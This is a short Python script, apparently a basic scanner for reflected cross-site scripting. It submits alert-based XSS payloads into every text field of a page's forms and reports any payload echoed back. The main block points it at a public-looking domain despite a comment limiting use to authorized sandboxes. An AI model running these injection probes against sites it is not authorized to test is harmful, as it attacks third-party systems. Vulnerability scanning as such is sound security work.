import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# Standard payloads designed to test input reflection and structural breakdown
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert(1)"
]

def get_all_forms(url):
    """Extracts all HTML forms from a given webpage target."""
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.content, "html.parser")
        return soup.find_all("form")
    except requests.exceptions.RequestException as e:
        print(f"[-] Connection failed on {url}: {e}")
        return []

def extract_form_details(form):
    """Parses forms to gather submission actions, methods, and specific inputs."""
    details = {}
    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower()
    
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        if input_name:
            inputs.append({"type": input_type, "name": input_name})
            
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def submit_form(form_details, url, value):
    """Submits the payload value into all form inputs detected."""
    target_url = urljoin(url, form_details["action"])
    data = {}
    
    for input_field in form_details["inputs"]:
        if input_field["type"] == "text" or input_field["type"] == "search":
            data[input_field["name"]] = value
        else:
            data[input_field["name"]] = "test" # Default string for other inputs

    if form_details["method"] == "post":
        return requests.post(target_url, data=data, timeout=5)
    return requests.get(target_url, params=data, timeout=5)

def run_scanner(url):
    """Main scanning workflow orchestrator."""
    print(f"[*] Discovering forms on target: {url}")
    forms = get_all_forms(url)
    print(f"[+] Total forms located: {len(forms)}")
    
    is_vulnerable = False
    
    for index, form in enumerate(forms, 1):
        form_details = extract_form_details(form)
        print(f"[*] Auditing form #{index} via HTTP {form_details['method'].upper()}")
        
        for payload in XSS_PAYLOADS:
            try:
                response = submit_form(form_details, url, payload)
                # Check if the payload is reflected explicitly inside the raw response body
                if payload in response.text:
                    print(f"[!] POSSIBLE XSS DETECTED on {url}")
                    print(f"    - Action Endpoint: {form_details['action']}")
                    print(f"    - Payload Exploited: {payload}")
                    is_vulnerable = True
                    break # Move to next form if current one is broken
            except requests.exceptions.RequestException:
                continue
                
    if not is_vulnerable:
        print("[+] Scan finalized. No basic reflected XSS found via forms.")

if __name__ == "__main__":
    # Always test your scripts exclusively against authorized sandboxes or local instances!
    target_target = "https://myWIPhealing.com"
    run_scanner(target_target)